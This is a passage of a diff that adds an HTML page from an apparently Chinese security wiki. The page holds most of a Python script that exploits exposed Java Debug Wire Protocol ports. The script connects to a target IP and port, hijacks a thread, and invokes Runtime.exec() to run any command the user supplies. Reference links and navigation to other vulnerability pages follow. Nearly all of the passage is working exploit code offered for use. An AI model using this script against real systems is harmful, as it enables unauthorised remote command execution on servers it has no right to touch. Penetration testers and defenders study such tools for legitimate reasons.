+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">):</span>
+            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">readstring</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">return</span> <span class="s2">&quot;&quot;</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">query_thread</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">threadId</span><span class="p">,</span> <span class="n">kind</span><span class="p">):</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">objectIDSize</span><span class="p">,</span> <span class="n">threadId</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_packet</span><span class="p">(</span><span class="n">kind</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span> <span class="p">)</span>
+        <span class="n">buf</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">read_reply</span><span class="p">()</span>
+        <span class="k">return</span> <span class="n">buf</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">suspend_thread</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">threadId</span><span class="p">):</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">query_thread</span><span class="p">(</span><span class="n">threadId</span><span class="p">,</span> <span class="n">THREADSUSPEND_SIG</span><span class="p">)</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">status_thread</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">threadId</span><span class="p">):</span>
+        <span class="n">buf</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">query_thread</span><span class="p">(</span><span class="n">threadId</span><span class="p">,</span> <span class="n">THREADSTATUS_SIG</span><span class="p">)</span>
+        <span class="n">formats</span> <span class="o">=</span> <span class="p">[</span> <span class="p">(</span><span class="s1">&#39;I&#39;</span><span class="p">,</span> <span class="s2">&quot;threadStatus&quot;</span><span class="p">),</span>
+                   <span class="p">(</span><span class="s1">&#39;I&#39;</span><span class="p">,</span><span class="s1">&#39;suspendStatus&#39;</span><span class="p">)]</span>
+        <span class="n">threadStatus</span> <span class="o">=</span> <span class="n">cli</span><span class="o">.</span><span class="n">parse_entries</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">formats</span><span class="p">,</span> <span class="kc">False</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">threadStatus</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">resume_thread</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">threadId</span><span class="p">):</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">query_thread</span><span class="p">(</span><span class="n">threadId</span><span class="p">,</span> <span class="n">THREADRESUME_SIG</span><span class="p">)</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">send_event</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">eventCode</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">):</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+        <span class="n">data</span><span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span> <span class="n">eventCode</span> <span class="p">)</span>
+        <span class="n">data</span><span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span> <span class="n">SUSPEND_ALL</span> <span class="p">)</span>
+        <span class="n">data</span><span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">))</span>
+
+        <span class="k">for</span> <span class="n">kind</span><span class="p">,</span> <span class="n">option</span> <span class="ow">in</span> <span class="n">args</span><span class="p">:</span>
+            <span class="n">data</span><span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span> <span class="n">kind</span> <span class="p">)</span>
+            <span class="n">data</span><span class="o">+=</span> <span class="n">option</span>
+
+        <span class="bp">self</span><span class="o">.</span><span class="n">socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_packet</span><span class="p">(</span><span class="n">EVENTSET_SIG</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span> <span class="p">)</span>
+        <span class="n">buf</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">read_reply</span><span class="p">()</span>
+        <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">clear_event</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">eventCode</span><span class="p">,</span> <span class="n">rId</span><span class="p">):</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">eventCode</span><span class="p">)</span>
+        <span class="n">data</span><span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="n">rId</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_packet</span><span class="p">(</span><span class="n">EVENTCLEAR_SIG</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span> <span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">read_reply</span><span class="p">()</span>
+        <span class="k">return</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">clear_events</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_packet</span><span class="p">(</span><span class="n">EVENTCLEARALL_SIG</span><span class="p">)</span> <span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">read_reply</span><span class="p">()</span>
+        <span class="k">return</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">wait_for_event</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">buf</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">read_reply</span><span class="p">()</span>
+        <span class="k">return</span> <span class="n">buf</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">parse_event</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">eventId</span><span class="p">):</span>
+        <span class="n">num</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">6</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="n">rId</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">10</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="k">if</span> <span class="n">rId</span> <span class="o">!=</span> <span class="n">eventId</span><span class="p">:</span>
+            <span class="k">return</span> <span class="kc">None</span>
+        <span class="n">tId</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">unformat</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">objectIDSize</span><span class="p">,</span> <span class="n">buf</span><span class="p">[</span><span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="o">+</span><span class="bp">self</span><span class="o">.</span><span class="n">objectIDSize</span><span class="p">])</span>
+        <span class="n">loc</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> <span class="c1"># don&#39;t care</span>
+        <span class="k">return</span> <span class="n">rId</span><span class="p">,</span> <span class="n">tId</span><span class="p">,</span> <span class="n">loc</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">runtime_exec</span><span class="p">(</span><span class="n">jdwp</span><span class="p">):</span>
+
+    <span class="c1"># 1. get Runtime class reference</span>
+    <span class="n">runtimeClass</span> <span class="o">=</span> <span class="n">jdwp</span><span class="o">.</span><span class="n">get_class_by_name</span><span class="p">(</span><span class="s2">&quot;Ljava/lang/Runtime;&quot;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">runtimeClass</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="nb">print</span> <span class="p">(</span><span class="s2">&quot;[-] Cannot find class Runtime&quot;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="kc">False</span>
+    <span class="nb">print</span> <span class="p">(</span><span class="s2">&quot;[+] Found Runtime class: id=</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">runtimeClass</span><span class="p">[</span><span class="s2">&quot;refTypeId&quot;</span><span class="p">])</span>
+
+    <span class="c1"># 2. get getRuntime() meth reference</span>
+    <span class="n">jdwp</span><span class="o">.</span><span class="n">get_methods</span><span class="p">(</span><span class="n">runtimeClass</span><span class="p">[</span><span class="s2">&quot;refTypeId&quot;</span><span class="p">])</span>
+    <span class="n">getRuntimeMeth</span> <span class="o">=</span> <span class="n">jdwp</span><span class="o">.</span><span class="n">get_method_by_name</span><span class="p">(</span><span class="s2">&quot;getRuntime&quot;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">getRuntimeMeth</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="nb">print</span> <span class="p">(</span><span class="s2">&quot;[-] Cannot find method Runtime.getRuntime()&quot;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="kc">False</span>
+    <span class="nb">print</span> <span class="p">(</span><span class="s2">&quot;[+] Found Runtime.getRuntime(): id=</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">getRuntimeMeth</span><span class="p">[</span><span class="s2">&quot;methodId&quot;</span><span class="p">])</span>
+
+    <span class="c1"># 3. setup &#39;step into&#39; event</span>
+    <span class="n">threads</span> <span class="o">=</span> <span class="n">jdwp</span><span class="o">.</span><span class="n">allthreads</span><span class="p">()</span>
+    <span class="k">for</span> <span class="n">thread</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
+        <span class="n">threadStatus</span> <span class="o">=</span> <span class="n">jdwp</span><span class="o">.</span><span class="n">status_thread</span><span class="p">(</span><span class="n">thread</span><span class="p">[</span><span class="s1">&#39;threadId&#39;</span><span class="p">])</span>
+        <span class="n">threadStatus</span> <span class="o">=</span> <span class="n">threadStatus</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s2">&quot;threadStatus&quot;</span><span class="p">]</span>
+        <span class="k">if</span> <span class="n">threadStatus</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span> <span class="c1">#Sleeping</span>
+            <span class="n">threadId</span> <span class="o">=</span> <span class="n">thread</span><span class="p">[</span><span class="s1">&#39;threadId&#39;</span><span class="p">]</span>
+            <span class="k">break</span>
+    <span class="k">if</span> <span class="s2">&quot;threadId&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">dir</span><span class="p">():</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Could not find a suitable thread for stepping&quot;</span><span class="p">)</span>
+        <span class="n">exit</span><span class="p">()</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Setting &#39;step into&#39; event in thread: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">threadId</span><span class="p">)</span>
+    <span class="n">jdwp</span><span class="o">.</span><span class="n">suspendvm</span><span class="p">()</span>
+    <span class="n">step_info</span>  <span class="o">=</span> <span class="n">jdwp</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">jdwp</span><span class="o">.</span><span class="n">objectIDSize</span><span class="p">,</span> <span class="n">threadId</span><span class="p">)</span>
+    <span class="n">step_info</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span><span class="n">STEP_MIN</span><span class="p">)</span>
+    <span class="n">step_info</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span><span class="n">STEP_INTO</span><span class="p">)</span>
+    <span class="n">data</span>       <span class="o">=</span> <span class="p">[</span> <span class="p">(</span><span class="n">MODKIND_STEP</span><span class="p">,</span> <span class="n">step_info</span><span class="p">),</span> <span class="p">]</span>
+
+    <span class="n">rId</span> <span class="o">=</span> <span class="n">jdwp</span><span class="o">.</span><span class="n">send_event</span><span class="p">(</span><span class="n">EVENTKIND_STEP</span><span class="p">,</span> <span class="o">*</span><span class="n">data</span><span class="p">)</span>
+
+    <span class="c1"># 4. resume vm and wait for event</span>
+    <span class="n">jdwp</span><span class="o">.</span><span class="n">resumevm</span><span class="p">()</span>
+
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">buf</span> <span class="o">=</span> <span class="n">jdwp</span><span class="o">.</span><span class="n">wait_for_event</span><span class="p">()</span>
+        <span class="n">ret</span> <span class="o">=</span> <span class="n">jdwp</span><span class="o">.</span><span class="n">parse_event</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">rId</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">ret</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+            <span class="k">break</span>
+
+    <span class="n">rId</span><span class="p">,</span> <span class="n">tId</span><span class="p">,</span> <span class="n">loc</span> <span class="o">=</span> <span class="n">ret</span>
+    <span class="nb">print</span> <span class="p">(</span><span class="s2">&quot;[+] Received matching event from thread </span><span class="si">%#x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">tId</span><span class="p">)</span>
+
+    <span class="n">jdwp</span><span class="o">.</span><span class="n">clear_event</span><span class="p">(</span><span class="n">EVENTKIND_STEP</span><span class="p">,</span> <span class="n">rId</span><span class="p">)</span>
+
+    <span class="c1"># 5. Now we can execute any code</span>
+    <span class="n">runtime_exec_payload</span><span class="p">(</span><span class="n">jdwp</span><span class="p">,</span> <span class="n">tId</span><span class="p">,</span> <span class="n">runtimeClass</span><span class="p">[</span><span class="s2">&quot;refTypeId&quot;</span><span class="p">],</span> <span class="n">getRuntimeMeth</span><span class="p">[</span><span class="s2">&quot;methodId&quot;</span><span class="p">],</span> <span class="n">args</span><span class="o">.</span><span class="n">cmd</span><span class="p">)</span>
+
+
+    <span class="n">jdwp</span><span class="o">.</span><span class="n">resumevm</span><span class="p">()</span>
+
+    <span class="nb">print</span> <span class="p">(</span><span class="s2">&quot;[!] Command successfully executed&quot;</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="kc">True</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">runtime_exec_payload</span><span class="p">(</span><span class="n">jdwp</span><span class="p">,</span> <span class="n">threadId</span><span class="p">,</span> <span class="n">runtimeClassId</span><span class="p">,</span> <span class="n">getRuntimeMethId</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>
+    <span class="c1">#</span>
+    <span class="c1"># This function will invoke command as a payload, which will be running</span>
+    <span class="c1"># with JVM privilege on host (intrusive).</span>
+    <span class="c1">#</span>
+    <span class="nb">print</span> <span class="p">(</span><span class="s2">&quot;[+] Selected payload &#39;</span><span class="si">%s</span><span class="s2">&#39;&quot;</span> <span class="o">%</span> <span class="n">command</span><span class="p">)</span>
+
+    <span class="c1"># 1. allocating string containing our command to exec()</span>
+    <span class="n">cmdObjIds</span> <span class="o">=</span> <span class="n">jdwp</span><span class="o">.</span><span class="n">createstring</span><span class="p">(</span> <span class="n">command</span> <span class="p">)</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">cmdObjIds</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="nb">print</span> <span class="p">(</span><span class="s2">&quot;[-] Failed to allocate command&quot;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="kc">False</span>
+    <span class="n">cmdObjId</span> <span class="o">=</span> <span class="n">cmdObjIds</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s2">&quot;objId&quot;</span><span class="p">]</span>
+    <span class="nb">print</span> <span class="p">(</span><span class="s2">&quot;[+] Command string object created id:</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">cmdObjId</span><span class="p">)</span>
+
+    <span class="c1"># 2. use context to get Runtime object</span>
+    <span class="n">buf</span> <span class="o">=</span> <span class="n">jdwp</span><span class="o">.</span><span class="n">invokestatic</span><span class="p">(</span><span class="n">runtimeClassId</span><span class="p">,</span> <span class="n">threadId</span><span class="p">,</span> <span class="n">getRuntimeMethId</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">TAG_OBJECT</span><span class="p">):</span>
+        <span class="nb">print</span> <span class="p">(</span><span class="s2">&quot;[-] Unexpected returned type: expecting Object&quot;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="kc">False</span>
+    <span class="n">rt</span> <span class="o">=</span> <span class="n">jdwp</span><span class="o">.</span><span class="n">unformat</span><span class="p">(</span><span class="n">jdwp</span><span class="o">.</span><span class="n">objectIDSize</span><span class="p">,</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="o">+</span><span class="n">jdwp</span><span class="o">.</span><span class="n">objectIDSize</span><span class="p">])</span>
+
+    <span class="k">if</span> <span class="n">rt</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="nb">print</span> <span class="s2">&quot;[-] Failed to invoke Runtime.getRuntime()&quot;</span>
+        <span class="k">return</span> <span class="kc">False</span>
+    <span class="nb">print</span> <span class="p">(</span><span class="s2">&quot;[+] Runtime.getRuntime() returned context id:</span><span class="si">%#x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">rt</span><span class="p">)</span>
+
+    <span class="c1"># 3. find exec() method</span>
+    <span class="n">execMeth</span> <span class="o">=</span> <span class="n">jdwp</span><span class="o">.</span><span class="n">get_method_by_name</span><span class="p">(</span><span class="s2">&quot;exec&quot;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">execMeth</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="nb">print</span> <span class="p">(</span><span class="s2">&quot;[-] Cannot find method Runtime.exec()&quot;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="kc">False</span>
+    <span class="nb">print</span> <span class="p">(</span><span class="s2">&quot;[+] found Runtime.exec(): id=</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">execMeth</span><span class="p">[</span><span class="s2">&quot;methodId&quot;</span><span class="p">])</span>
+
+    <span class="c1"># 4. call exec() in this context with the alloc-ed string</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">[</span> <span class="nb">chr</span><span class="p">(</span><span class="n">TAG_OBJECT</span><span class="p">)</span> <span class="o">+</span> <span class="n">jdwp</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">jdwp</span><span class="o">.</span><span class="n">objectIDSize</span><span class="p">,</span> <span class="n">cmdObjId</span><span class="p">)</span> <span class="p">]</span>
+    <span class="n">buf</span> <span class="o">=</span> <span class="n">jdwp</span><span class="o">.</span><span class="n">invoke</span><span class="p">(</span><span class="n">rt</span><span class="p">,</span> <span class="n">threadId</span><span class="p">,</span> <span class="n">runtimeClassId</span><span class="p">,</span> <span class="n">execMeth</span><span class="p">[</span><span class="s2">&quot;methodId&quot;</span><span class="p">],</span> <span class="o">*</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">TAG_OBJECT</span><span class="p">):</span>
+        <span class="nb">print</span> <span class="p">(</span><span class="s2">&quot;[-] Unexpected returned type: expecting Object&quot;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="kc">False</span>
+
+    <span class="n">retId</span> <span class="o">=</span> <span class="n">jdwp</span><span class="o">.</span><span class="n">unformat</span><span class="p">(</span><span class="n">jdwp</span><span class="o">.</span><span class="n">objectIDSize</span><span class="p">,</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="o">+</span><span class="n">jdwp</span><span class="o">.</span><span class="n">objectIDSize</span><span class="p">])</span>
+    <span class="nb">print</span> <span class="p">(</span><span class="s2">&quot;[+] Runtime.exec() successful, retId=</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">retId</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="kc">True</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s2">&quot;Universal exploitation script for JDWP by @Lz1y, base on @_hugsy_&quot;</span><span class="p">,</span>
+                                     <span class="n">formatter_class</span><span class="o">=</span><span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentDefaultsHelpFormatter</span> <span class="p">)</span>
+
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;-t&quot;</span><span class="p">,</span> <span class="s2">&quot;--target&quot;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s2">&quot;IP&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;Remote target IP&quot;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;-p&quot;</span><span class="p">,</span> <span class="s2">&quot;--port&quot;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s2">&quot;PORT&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">8000</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;Remote target port&quot;</span><span class="p">)</span>
+
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;-c&quot;</span><span class="p">,</span> <span class="s2">&quot;--cmd&quot;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s2">&quot;cmd&quot;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s2">&quot;COMMAND&quot;</span><span class="p">,</span>
+                        <span class="n">help</span><span class="o">=</span><span class="s2">&quot;Specify command to execute remotely&quot;</span><span class="p">)</span>
+
+    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+    <span class="n">cli</span> <span class="o">=</span> <span class="n">JDWPClient</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">target</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">port</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">cli</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Handshake failed!&quot;</span><span class="p">)</span>
+
+    <span class="c1">#print vm description</span>
+    <span class="nb">print</span> <span class="s2">&quot;[+] Dump vm description </span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">cli</span><span class="o">.</span><span class="n">description</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span>
+    <span class="n">runtime_exec</span><span class="p">(</span><span class="n">cli</span><span class="p">)</span>
+    <span class="n">cli</span><span class="o">.</span><span class="n">leave</span><span class="p">()</span>
+</code></pre></div>
+
+<h2 id="_6">参考链接<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://www.cnblogs.com/sq-smile/protected/p/13172831.html">https://www.cnblogs.com/sq-smile/protected/p/13172831.html</a></p>
+<p><a href="https://github.com/Lz1y/jdwp-shellifier">https://github.com/Lz1y/jdwp-shellifier</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../JEEVMS%E4%BB%93%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/JEEVMS%E4%BB%93%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../JEEVMS%E4%BB%93%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/JEEVMS%E4%BB%93%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        JEEVMS仓库管理系统任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../JD-FreeFuck/JD-FreeFuck%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../JD-FreeFuck/JD-FreeFuck%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        JD-FreeFuck 后台命令执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
